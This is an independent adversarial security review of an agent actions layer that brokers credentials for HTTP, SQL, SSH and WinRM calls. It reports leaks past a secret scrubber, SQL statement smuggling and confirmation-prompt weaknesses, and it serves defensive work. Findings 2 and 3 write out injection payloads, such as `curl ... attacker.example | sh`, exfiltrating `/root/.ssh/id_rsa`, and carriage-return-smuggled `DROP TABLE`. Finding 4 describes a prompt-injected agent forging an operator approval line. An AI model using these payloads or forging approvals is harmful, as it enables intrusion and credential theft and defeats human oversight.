# Independent security review of the actions layer, 2026-09-24

An adversarial review of the actions layer on `main` at `f651e5f` (milestones M9 to M14 landed) by
a reviewer with no involvement in the implementation, working from a fresh clone. Reproduced
verbatim. Findings 1 to 3 were required before approval; the fixes landed in the releases that
follow (see the changelog).

A second reviewer examined the `ssh` and `winrm` connectors independently over the same tree; that
report is [`2026-09-24-connector-review.md`](2026-09-24-connector-review.md). The two reviewers
agreed, separately, on two findings: the WinRM Basic credential is never scrubbed, and a wildcard
in a command allowlist admits shell metacharacters.

---

Adversarial review of the actions layer on `main` (`f651e5f`, M9–M14 landed), by a reviewer with no
involvement in the implementation, working from a fresh clone. I read ADR 0007, specs 13/13a/14 and
the threat model, then `src/actions/**`, `src/mcp/tools/actions*.ts`, `src/net/**` and the account
pages. The full suite passes as shipped (194 files, 1 649 tests). Findings below carry file:line,
severity, and whether I verified them by running code against the real modules or judged them from
reading.

## Findings

### 1. A non-textual response body defeats the scrubber entirely — HIGH (verified end-to-end against the real engine)

`src/actions/connectors/http/response.ts:73-80`. When `isText()` is false, `toOutput`
**base64-encodes the raw body and hands the encoded text to the engine as `captured.body`**. The
engine's scrub table (`src/actions/scrub.ts:117-141`) holds the raw value, its URL and form
encodings, its own base64, and the JSON escape — none of which appear in _the base64 of a buffer
that merely contains the value_. Base64 is positional: unless the credential starts at an offset
that is a multiple of 3 and runs to the end of the body, `base64(body)` contains no substring equal
to `base64(secret)`. The scrubber runs over the encoded text (`engine-run.ts:140-150`) and matches
nothing.

Verified through `createActionsHarness` plus the real `http` connector and the real fixture vault,
one `http_request` on a granted target: the response came back with `body_encoding: base64`,
`truncated: false`, and the decoded body contained `Bearer CANARY-PASSWORD-9f3c1a` in full. The
canary password reached the agent; no `[redacted:]` marker appeared anywhere.

I tested offsets 0 to 5 with trailing bytes: **every alignment leaks**, with no redaction marker
anywhere. This is not limited to `application/octet-stream` — `isText` also returns false for any
_textual_ content type whose bytes are not valid UTF-8 (`response.ts:31-45`), so `text/plain` in
latin-1 with one high byte takes the same path (verified).

This breaks the layer's second design rule verbatim ("Secrets never come back", ACT-51 and ACT-52),
ACT-53's canary invariant, and the T34 mitigation the threat model states as complete. It is _not_
covered by the accepted residual risk about destinations transforming a credential — **vaultgate
itself applies this encoding**, after its own scrub table was built, and then scrubs the wrong
representation.

Why it survived: the canary suite's fake destination always answers `content-type:
application/json` (`src/test-support/http-connector.ts:101-115`), so no containment test ever
exercises the base64 branch. The base64 branch is tested for _shape_ only (`response.test.ts:74-92`,
`run.test.ts:79-86`). The MCP-9 containment suite (`src/mcp/tools/containment.test.ts`) covers the
vault tools, not the actions tools.

Fix: scrub the **raw bytes** before encoding. Add a `Scrubber.bytes(input: Buffer): Buffer` doing
`Buffer.indexOf` replacement for each variant, apply it in `toOutput` before `.toString('base64')`,
and add a canary test with a non-textual body per connector.

### 2. SQL comment scanning stops at a line feed only: a bare carriage return smuggles a second statement past classification and the allowlist — HIGH (classifier and policy verified by running; server execution verified for the driver's protocol choice, reasoned for the server-side comment rule)

`src/actions/connectors/sql/tokens.ts:100-103`:

```ts
function endOfLineComment(source: string, start: number): number {
  const newline = source.indexOf('\n', start);
  return newline === -1 ? source.length : newline;
}
```

PostgreSQL's lexer defines `non_newline [^\n\r]`, so a bare carriage return **ends** a `--` comment
on the server; T-SQL likewise treats it as a line terminator. vaultgate's tokeniser swallows
everything after `--` up to a line feed, so a carriage-return-terminated comment hides the rest of
the statement from `hasSecondStatement` (`classify.ts:112-115`) and from the deny-keyword scan
(`classify.ts:88-90`). The statement schema places no restriction on control characters
(`sql/operation.ts:22-33`).

Verified by running the real `classifyStatement` and `authorize` for both engines:

| statement                                                                   | classifier                 | `sql_query` |
| --------------------------------------------------------------------------- | -------------------------- | ----------- |
| `SELECT 1 --x` + line feed + `; DROP TABLE audit_log`                       | `REFUSED(statement_count)` | denied      |
| `SELECT 1 --x` + carriage return + `; DROP TABLE audit_log`                 | **`read`**                 | **allowed** |
| `SELECT id FROM t --` + carriage return + `; UPDATE users SET role='admin'` | **`read`**                 | **allowed** |

It also walks straight through `statement_allowlist`, because the glob matcher's `*` stops at a line
feed and not at a carriage return (`policy.ts:139-149`). Using the guide's own worked example
(`docs/guides/actions.md:313-317`, "`DELETE FROM sessions WHERE *` admits any single-line delete
from that table"), both engines answered `{"allowed":true,"operation":"write","class":"dml"}` for a
statement that reaches the server as `DELETE FROM sessions WHERE id = 1 --` carriage return
`; DROP TABLE customers`.

So a target whose policy says `write_classes: ['dml']` plus a narrow `statement_allowlist` runs
`DROP TABLE`. Multi-statement execution: I confirmed by running the driver's own
`Query.requiresPreparation()` on the exact call shape used at `postgres/session.ts:158-162` that
**zero bound parameters selects the simple query protocol** (multi-statement allowed); with one
parameter it is the extended protocol (single statement). `mssql` sends `request.text` as a T-SQL
batch (`mssql/session.ts:204`), where multi-statement is unconditional.

Honest scoping of impact:

- **`sql_execute` (both engines) — the serious case.** The write session is `BEGIN` with no
  read-only mode (`postgres/session.ts:72-74`), and ACT-85's least-privilege login has write rights
  by construction, so nothing else stops it. `write_classes` and `statement_allowlist` are the only
  vaultgate-side controls and both are escaped.
- **`sql_query` on SQL Server** — no read-only session exists (14.4 says the classification _is_ the
  control there), so smuggled writes execute, bounded only by the login's grants.
- **`sql_query` on PostgreSQL** — contained. `SET default_transaction_read_only = on` plus
  `BEGIN READ ONLY` (`postgres/session.ts:157, 192-194`) makes the server refuse the smuggled write.
  Layered defence working as designed; credit where due.

Worth contrasting: the command connectors get this right. `command.ts:152-154` refuses any carriage
return **or** line feed before the allowlist match on a non-`any_command` target (verified). The SQL
connector has no equivalent.

Fix: terminate `--` at a carriage return as well as a line feed. Consider also adding `WRITETEXT`,
`UPDATETEXT`, `READTEXT` and `DBCC` to `DENIED` (`classify.ts:19-46`) — the set matches ACT-37
exactly, so this is a spec omission rather than drift, but those are T-SQL write and maintenance
verbs that classify `read` today.

### 3. A trailing wildcard in a command allowlist is an unrestricted shell, with none of ACT-88's controls — MEDIUM-HIGH (verified)

`src/actions/policy.ts:178-191`. `commandPatternProblem` refuses only a pattern that matches the
_empty_ command. A pattern such as `systemctl status *` therefore saves with no warning — but `*`
matches any run of characters except a newline (ACT-34), and a semicolon, `&&`, a backtick, `$(…)`
and a pipe are not newlines. On a POSIX shell (the SSH library's `exec` runs the string through the
user's login shell) or in PowerShell (`-EncodedCommand` takes the whole string as a script), those
are all interpreted.

I ran the guide's own recommended policy (`docs/guides/actions.md:541-545`) through the real
`createCommandAuthorize` and `commandPatternProblem`. The save-time verdict was "accepted, no
warning", and the authorizer allowed every one of these:

- `journalctl -u nginx --since $(curl -s http://attacker.example/p | sh) --no-pager`
- `journalctl -u nginx --since` backtick `cat /etc/shadow > /tmp/x` backtick `--no-pager`
- `journalctl -u nginx --since x; curl -s http://attacker.example/p | sh; echo --no-pager`
- `systemctl status nginx; curl http://attacker.example/$(cat /root/.ssh/id_rsa | base64 -w0)`

Note the second and third: even a wildcard _bounded on both sides_ — the shape the guide presents as
the safe idiom — is injectable via command substitution. So in practice any wildcard in a command
pattern is `any_command`.

This directly undercuts ACT-88's design. A genuine `any_command: true` target needs
`VAULTGATE_ACTIONS_ALLOW_ANY_COMMAND=true`, carries a standing page warning, is reported to agents
as `unrestricted: true`, and has its full command written to `classification`. A `foo *` target gets
none of those four, and `actions_list_targets` tells the agent it is restricted.

Fix: at minimum, warn at save when a pattern's wildcard is not bounded by a literal on the right,
and document that `*` spans shell metacharacters. Better: refuse shell metacharacters in the
_command_ unless `any_command` is set, which is the same shape as the existing carriage-return and
line-feed rule at `command.ts:152`.

### 4. The human confirmation prompt is agent-controlled text, silently truncated at 1 KiB — MEDIUM (verified)

ACT-41 to ACT-43 make the elicitation prompt the last line of defence for every write, shell or
browser-act call on a confirmed target, and T24 names it as a mitigation against exactly the
prompt-injected-agent case: a compromised _model_ inside an _honest_ client, where the human really
does see the prompt. Two problems with what they see.

**Silent truncation.** `describeCommand` (`command.ts:184-192`) and the SQL `describeOperation`
(`sql/authorize.ts:84-93`) cut the summary at `SUMMARY_CAP = 1024` with no ellipsis or marker, while
`command` may be 16 KiB and `statement` 64 KiB. Verified with a 1210-character command: the summary
was 1024 characters, ended mid-sentence in benign filler, showed none of the dangerous tail, and
carried no marker indicating that anything had been cut.

**The audit trail is blind in the same place.** `encodeArguments` (`calls.ts:76-85`) cuts
`arguments` at 4 KiB. For `ssh` and `winrm` on an any-command target ACT-88 compensates by putting
the whole command in `classification`; **for `sql` there is no such fallback** — `classification` is
just `dml`. Verified with a 64 037-byte statement: 4096 bytes of arguments were kept,
`arguments_truncated` was true, and the `DELETE` was not visible in the row.

So one crafted `sql_execute` hides its operative clause from both the human prompt _and_ the
"unexpected write" review view the guide points operators at.

**Structural forgery.** The summary is interpolated verbatim between blank-line delimiters
(`confirm.ts:218-221`), and SQL statements and any-command commands may contain newlines. An agent
can reproduce the prompt's own trailer, including a plausible "Approved by the operator" line, so
the message appears to end early and the real operation follows below what looks like the end.

Fix: mark truncation explicitly, and either refuse to confirm an operation longer than the summary
cap or show a hash the operator page can be checked against. For the audit side, store the full
statement, or at least a digest of it, alongside the 4 KiB excerpt.

### 5. The WinRM Basic credential is missing from the scrub variant list — MEDIUM (verified)

`src/actions/connectors/winrm/schemas.ts:96-98` returns only `{ password_field, role: 'secret' }`;
the login name lives in the _destination_ (`:73`), not the credential. So the engine builds the
scrub table with `username === undefined` and `scrubVariants` never generates the
`base64(username:password)` variant that ACT-51 lists — even though `client.ts:87-93` authenticates
with exactly that string. The `http` `basic` mode does it correctly, because `username_from` is
registered with `role: 'username'` (`http/schemas.ts:120`). Verified side by side: the WinRM basic
pair variant was not generated, a fault detail leaked the pair, and the agent could decode it to
`svc-vaultgate:CANARY-PASSWORD-9f3c1a`; the `http` basic mode generated the variant and leaked
nothing.

Reachable by the T33 and T34 hostile-destination attacker: a compromised WinRM listener returns a
SOAP fault whose reason echoes the `Authorization` header; that reason travels as
`upstream_error.detail.message`, scrubbed with a table that does not contain it. Fix: pass the
destination's `username` into the holder, or add the basic-pair variant from the connector.

### 6. An encoded separator in a path walks past `allowed_paths` — MEDIUM (verified in vaultgate; server-side effect plausible, not tested against a live destination)

`src/actions/policy.ts:205-210` decodes only RFC 3986 unreserved characters, so `%2F` survives
normalisation and is not a path separator for dot-segment removal — and `*` in a path pattern stops
at a literal `/`, not at `%2F`. Verified with the real `authorize`: for the pattern `/orders/*`,
`/orders/17` is allowed as expected, and so are `/orders/..%2F..%2Fadmin%2Fusers` and
`/orders/%2e%2e%2fadmin`, each reaching the wire with the encoded separator intact.

The origin is never moved (that part is solid, see below), so this is confinement _within_ the
destination, not request forgery. Whether it escapes depends on the destination decoding `%2F`
before routing, which several application servers, API gateways and proxy configurations do.
ACT-20's "the resolved URL MUST stay under `base_url` after normalisation" is the property at stake.
Fix: refuse `%2f` and `%5c` in the path portion in `pathProblem` (`http/operation.ts:27-44`),
alongside the existing backslash, fragment, double-slash and dot-segment rules.

### 7. Scrubbing blocks the event loop, and does it twice — LOW/MEDIUM (measured)

`src/actions/scrub.ts:154-170` is a synchronous left-to-right scan that calls
`table.find(...startsWith)` at every character. Measured against a four-secret table (a Graph target
at the end of a call holds the client secret, the refresh token, the rotated refresh token and the
access token) with a guard band of 1948 bytes: 166.3 ms for a random mebibyte, 118.7 ms for JSON,
175.9 ms worst case.

And `engine-run.ts:140-150` scrubs the body **twice** — once in `scrub.buffer`, then again as part
of `scrub.deep` over the result that already contains the scrubbed text. So a target with a
mebibyte of output costs roughly 250 to 350 ms of blocking single-threaded processor time per call,
at 120 calls per minute per client with 8 concurrent, on the same event loop that serves the OAuth
endpoints and the operator pages. Fix: drop the redundant `deep` pass over keys already handled by
`buffer`, and consider a precomputed first-byte index for the variant table.

### 8. Operator pages: two crashes that skip the audit trail — LOW (verified)

The pages themselves are clean (see below); these are error-handling defects reached through them.

- `src/identity/csrf.ts:26-31` compares `submitted?.length === expected.length` (UTF-16 code units)
  then `timingSafeEqual(Buffer.from(...), ...)` (bytes). A token of the same code-unit length
  containing a multibyte character throws `RangeError: Input buffers must have the same byte
length`, which escapes to `app.onError` and becomes **500 with no audit event**, where ID-18
  requires 403 with one. Verified directly against `isValidCsrfToken`. Not a bypass (the origin
  check and the session precede it), but a malformed-token attempt is invisible in the trail.
  Reachable on every account route, not only the actions pages. Fix: compare `Buffer.byteLength`, or
  hash both sides.
- `src/actions/pages/routes.ts:156` — `NOTICES[context.req.query('notice') ?? '']` on a plain object
  literal returns an inherited member for `constructor`, `toString`, `__proto__` or `valueOf`, which
  `render()` (`identity/pages/template.ts:21-29`) then calls `.map` on, giving a `TypeError` and a 500. Verified. Not injectable, since no inherited property is a string, so the ceiling is a
  reflected error. Same pattern at `identity/routes-account.ts:283`. Fix: `Object.hasOwn`, or a
  `Map`.

### 9. Smaller items

- **Unscrubbed driver text into the log.** `sql/run.ts:116-122` and `winrm/run.ts:55-61` log
  `{ reason: <driver message> }` on a failed session close. ACT-53's logger protection is redaction
  _by field name_, which will not catch a free-text `reason`. Neither driver is known to put the
  password in a close error, so this is hygiene rather than a demonstrated leak, but it is the one
  path in those connectors where upstream text reaches the log without passing the scrubber.
- **The ID-19 content security policy on actions pages is an untested cross-module invariant.**
  `src/actions/pages/` never applies `pageHeaders`; the header arrives only because
  `identity/routes.ts:28-29` registers `app.use('/account/*', pageHeaders)` and `http/app.ts:103`
  mounts identity _before_ actions at `:105`. Swapping the two mount calls yields no policy and no
  cache-control on every actions page. Today's composition is correct and I am not claiming a live
  vulnerability, but no test asserts the policy or `no-store` on any `/account/actions/*` response.
  One line inside `createActionsRoutes` would make it self-standing.
- **The confirmation is only as good as the client.** `elicitationCapability` reads `params._meta`
  from the request body (`actions-call.ts:66-75`), which the client controls, and the `accept` with
  `confirm: true` answer is likewise the client's assertion. This is inherent to MCP elicitation and
  correctly scoped in T24 (prompt-injected _model_, honest client) — a compromised client already
  holds the grant. Worth stating plainly in the threat model, because it is the reason finding 4
  matters: against the attacker the control is actually for, the prompt text is entirely
  attacker-chosen.
- `winrm/client.ts:205-219` polls `Receive` with no backoff; a host answering `TimedOut` instantly
  produces a tight request loop until the policy timeout, up to 300 seconds. Bounded and
  memory-safe, but a free amplifier for a hostile host.

## Categories where I found nothing

- **Destination and identity integrity — clean.** I fuzzed 30 adversarial paths (`%2e%2e`, `..%2f`,
  `%252e`, double slashes, backslashes, fullwidth and fraction slashes, `@evil.com`, dot-segment
  edge cases) across three `base_url` shapes: not one produced a URL off the destination's origin,
  and each is either refused by the schema, refused by `httpSubject`, or lands under the base prefix.
  The policy subject is the exact string the wire sees (`request.ts:66-92`), so pattern and request
  cannot disagree. Redirects re-check `isUnderBase` and reuse the _already-pinned address_
  (`run.ts:73-119`), so a hop cannot reach a new host. `pinEndpoint` (`destination.ts:71-88`)
  resolves once, validates **every** returned address rather than only the first, pins the first, and
  fails closed on an unresolvable or mixed-class name; `pinnedLookup` (`pinned-https.ts:83-92`)
  forecloses a second resolution. `classifyAddress` unwraps IPv4-mapped forms and returns `invalid`
  for shapes it cannot parse. The Graph token endpoint is a hard-coded host with the tenant
  percent-encoded behind a strict identifier pattern, resolved and pinned per exchange
  (`graph/token.ts:53-55`, `graph/adapter.ts:69`). Finding 6 is confinement _within_ a destination,
  not a change of destination.
- **Confirmation replay and binding — clean apart from the message content.** `requestState` is
  HMAC-SHA256 under a purpose-separated subkey, compared in constant time, expiry-checked before the
  binding, and bound to the client, the token prefix, the target, its revision, the tool and a
  canonical-JSON digest of the whole argument object (`confirm.ts:96-148`). I traced the nonce race:
  the check and the insert are separated by two awaits, but `recordCall` does its check-and-insert
  inside one _synchronous_ transaction (`calls.ts:137-150`), so two concurrent retries cannot both
  pass, and the unique index backs it. Editing the target bumps the revision and invalidates every
  open confirmation. Nothing is held in server memory between the two round trips.
- **Grants and scopes — clean.** Every repository query is parameterised; `isGranted` requires
  `revoked_at IS NULL`; `onConsentRevoked` is genuinely wired in `main.ts:148-150`; `listTargets`
  filters by grant, connector switch, validity, enabled state and reachable scopes, and its output
  type has no field that could carry a destination or a pattern. No scope implies another.
- **Operator pages — clean.** All ten `POST /account/actions/*` routes call `sensitiveAction` as
  their first statement; 60 bypass attempts (no session, absent or wrong synchroniser token, no
  origin, foreign origin, expired five-minute re-authentication window) all returned 403 with zero
  state change. No `GET` mutates. Every agent-controlled sink on the call-history and
  unexpected-writes pages — including `classification`, which holds the whole command on an
  any-command target — is escaped, attribute break-out included; there is no raw-markup escape hatch
  in the layer. Mass assignment is doubly locked, by descriptor-driven form reading and by strict
  schemas. `any_command` is gated three independent times, including at the service layer beneath
  the pages. Save-time checks refuse loopback and link-local even with `internal: true`, and refuse a
  name that resolves to a mixed public and private set. A canary sweep across all four pages and the
  whole audit trail returned zero hits.
- **SSH host-key pinning — clean.** `isPinnedHostKey` fails closed on an unparseable pin; the
  verifier is synchronous, returns a boolean, and runs during key exchange; the authentication
  handler is a single fixed method with agent forwarding and keyboard-interactive disabled
  (`ssh/driver.ts:81-108`).
- **WinRM protocol handling — clean.** The reader refuses document type declarations, every entity,
  comments, character data sections and processing instructions, caps depth, element count and
  attribute count, and refuses a bare ampersand in both attribute values and character data
  (`winrm/xml.ts`). The attribute assignment is not a prototype-pollution sink: assigning a string
  through the `__proto__` setter is silently ignored and pollutes nothing. Envelopes escape every
  variable, and PowerShell uses UTF-16LE base64 with the shell skipped — the correct encoding.
  `Capture` bounds both streams; `readBodyCapped` bounds every response.

## Strongest aspects

The resolution order of ACT-16 is implemented exactly, including the subtle part: the grant check
precedes everything that would describe a target, and `credential_unavailable` is one fixed message
with the real reason going only to the operator's log. The confirmation state machine is genuinely
well built — stateless, bound to six independent facts including an argument digest, single-use with
a synchronous-transaction backstop, and correctly refusing rather than downgrading on a wire that
cannot elicit, with the impossibility of the alternative _proved_ in the spec, which is unusual and
admirable. The scrubber survives buffer zeroing by design, with a comment saying why. Connectors
receive no vault client, no resolver and no audit sink, only a capability object, and `authorize` is
pure and separately testable. The layered SQL defence works where it was designed to: the read-only
PostgreSQL session caught the smuggled write that the classifier let through. Address pinning is
done properly — resolve once, validate all, connect to the first, with the name kept only for the
TLS server name, the `Host` header and the host-key lookup — the exact fix the previous review
demanded, applied consistently. Documentation quality is exceptional and, notably, honest: the
residual-risk section predicts the _shape_ of finding 1 even though the implementation does not
cover it.

## Verdict

**Not yet.** Findings 1 and 2 each break a central claim: the first defeats "the agent never
receives the credential" for a whole class of response, the second lets `sql_execute` run statements
no policy allowed. Both are small fixes with a test each.

Required before I would approve:

1. **Finding 1** — scrub raw bytes before base64-encoding, and add a canary test with a non-textual
   body. Today a single hostile or compromised HTTP destination hands the agent the credential
   verbatim.
2. **Finding 2** — terminate `--` comments at a carriage return. Then decide whether the classifier
   should refuse control characters in a statement outright, as the command connectors already do.
3. **Finding 3** — stop `foo *` being a silent `any_command`. Either warn loudly at save or refuse
   shell metacharacters without the ACT-88 switch.

Findings 4 and 5 should follow closely: 4 because it is the control that is _supposed_ to stop the
prompt-injected agent, 5 because it is a small asymmetry with the `http` connector. Findings 6 to 9
are fast-follows.

## Method and limits

Findings 1, 2, 3, 4, 5, 6, 7 and 8 were verified by running the real modules; 1, 2 (the policy legs)
and 4 (the audit leg) were additionally driven end to end through the real engine harness. Three
things I could **not** run and have marked as reasoned: the server-side execution of the smuggled
SQL statement, since I had no live PostgreSQL or SQL Server — though I did confirm the driver's
protocol selection by running its own `Query.requiresPreparation()`, and PostgreSQL's
`non_newline [^\n\r]` lexer rule is documented behaviour; whether a given HTTP destination decodes
`%2F` before routing (finding 6); and live WinRM and SSH connections. I did not stand up a live
vaultgate instance — this review is entirely module and harness level — so route-level behaviours
were exercised through the application harness rather than over a socket. The `browser` connector of
M15 has no runtime and was not reviewed. Three of the four connector areas were cross-checked by a
second reviewer working independently; I re-verified every finding I have reported here myself. The
clone was deleted; nothing outside it was modified.
